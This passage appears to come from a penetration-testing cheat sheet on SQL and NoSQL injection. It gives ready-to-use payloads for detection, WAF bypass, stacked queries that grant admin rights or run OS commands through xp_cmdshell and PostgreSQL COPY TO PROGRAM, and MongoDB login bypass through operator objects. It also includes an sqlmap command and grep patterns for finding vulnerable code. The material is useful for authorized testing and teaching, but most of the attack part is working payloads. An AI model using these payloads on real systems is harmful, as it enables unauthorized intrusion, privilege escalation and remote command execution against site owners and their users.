## 7. SQL INJECTION

### Detection
```bash
' OR '1'='1
' UNION SELECT NULL--
'; SELECT 1/0--   → divide by zero confirms SQLi

# sqlmap (standard package: `sqlmap` on Kali/pip; the ~/tools/ path is only a local clone fallback)
sqlmap -u "https://target.com/search?q=test" --batch --level=3 --risk=2
```

### Grep for Vulnerable Code
```bash
# Python — no placeholder = string concat = vulnerable
grep -rn "execute\|executemany\|raw(" --include="*.py" | grep -v "?"

# JavaScript — string concat in query
grep -rn "\.query(" --include="*.js" --include="*.ts" | grep "\+"

# PHP — variable in raw query
grep -rn "mysql_query\|mysqli_query" --include="*.php" | grep "\$"
```

**WAF bypass for SQLi**: Run `tools/waf_encoder.py "<payload>" --class sqli` for comment-injection (`SE/**/LECT`), MySQL version comment (`/*!50000 UNION*/`), case-mix (`SeLeCt`), operator substitute (`OR`→`||`, `=`→`LIKE`), whitespace swap (`%0a`, `%0b`, `/**/ `). AWS WAF specifically: try `/**/` between every token. ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution.

### Confirm it's really SQLi (kill the WAF/latency false positives)
- **Boolean differential:** `' AND 1=1--` vs `' AND 1=2--` must return **different** responses. If `1=1` and `1=2` behave identically (both blocked or both same page), it's a WAF echo or reflection, **not** SQLi.
- **Time-based baseline:** measure normal latency first, then `SLEEP(5)` (MySQL) / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'` (MSSQL). Repeat 3×; if the *baseline* is also slow, it's network jitter, not injection. (See `reference/false-positive-guidance.md`.)

### Stacked Queries (second statement → write/RCE)
A `;` starts a new statement — turns read-only SQLi into INSERT/UPDATE/`xp_cmdshell`. **Driver-dependent**: MSSQL and PostgreSQL commonly allow stacking; MySQL via PHP `mysqli_query`/PDO usually does **not** (single-statement), but `PDO::MYSQL_ATTR_MULTI_STATEMENTS` or Node `mysql` multipleStatements re-enable it.
```sql
'; UPDATE users SET is_admin=1 WHERE email='me@x.com'--
'; EXEC xp_cmdshell 'whoami'--          -- MSSQL, if enabled
'; COPY (SELECT '') TO PROGRAM 'id'--   -- PostgreSQL ≥9.3 RCE
```
- **FP-kill:** confirm the write actually happened (row changed, admin action now works) — many drivers silently ignore the trailing statement.

### Second-Order SQLi
Injection is *stored* clean, then concatenated **unsanitized** into a query by a later feature (profile→admin report, filename→export, username→audit-log viewer). Detection: inject `sql'--` into every stored field, then exercise every place that data is later rendered/searched/exported. The sink is a different request than the source — scanners miss this.

### NoSQL Injection (MongoDB / document stores)
Auth and filters built from JSON/query params where an operator object is accepted instead of a scalar.
```
# Auth bypass — send operator object instead of string
{"user":"admin","pass":{"$ne":null}}          # $ne matches any password
{"user":{"$gt":""},"pass":{"$gt":""}}         # returns first user
# In URL/form (PHP/Express query parser turns bracket keys into objects)
user[$ne]=x&pass[$ne]=x
# Blind boolean via $regex
{"pass":{"$regex":"^a"}}                        # true/false oracle → extract char-by-char
# Server-side JS eval sink
{"$where":"sleep(5000)"}  ·  {"$where":"this.pass.length>0"}
```
Full payload set: `security-arsenal/reference/nosql-injection-payloads.md`.
- **FP-kill:** `{"$ne":null}` returning 200 is only a bug if it returns **another user's** data / authenticates you — a 200 with an empty/error body is not injection.

